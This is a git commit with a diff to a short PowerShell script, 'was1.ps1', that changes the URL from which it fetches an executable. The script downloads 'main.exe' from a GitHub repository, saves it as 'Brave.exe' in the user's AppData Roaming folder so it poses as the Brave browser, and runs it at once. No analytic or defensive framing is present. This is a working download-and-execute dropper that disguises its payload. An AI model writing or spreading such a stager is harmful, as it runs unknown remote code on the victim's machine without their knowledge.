abe9039dde3bcbf776f0e7b131d1ab04f3c6d63c
Dev Patel <109647822+dev-eloper-365@users.noreply.github.com>
2022-08-19 22:00:59 +0530

    0

--- was1.ps1
+++ was1.ps1
@@ -1,4 +1,4 @@
 $p="$HOME\AppData\Roaming\Brave.exe";
 $e=New-Object System.Net.WebClient;
-$e.DownloadFile("https://github.com/dev-eloper-365/Tasks/raw/main/main.exe",$p);
+$e.DownloadFile("https://github.com/Unknwn000/idk/blob/main/main.exe",$p);
 Start-Process -FilePath $p
